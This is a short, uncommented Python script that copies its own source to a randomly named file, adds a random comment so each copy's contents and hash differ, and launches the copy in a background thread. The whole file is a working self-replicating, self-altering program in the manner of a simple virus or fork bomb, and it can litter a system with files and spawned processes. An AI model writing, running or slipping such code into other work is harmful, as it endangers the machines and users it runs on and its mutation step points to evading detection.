import os
import sys
from threading import Thread
from pathlib import Path
from base64 import b64encode
import random
import string

print(Path.cwd())

print(os.path.basename(__file__))
thisfile = os.path.basename(__file__)
f = open(thisfile, "r")
lines = f.readlines()

filename = "newpython{randomness}.py".format(randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))

g = open(filename, "w")
count = len(lines)
start = 0 
for line in lines:
    start = start + 1
    if start == (count - 1):
        break
    g.write(line)

g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
g.close()
f.close()

def runFunc():
    os.system('python3 ' + filename)

thread = Thread(target=runFunc)
thread.start()
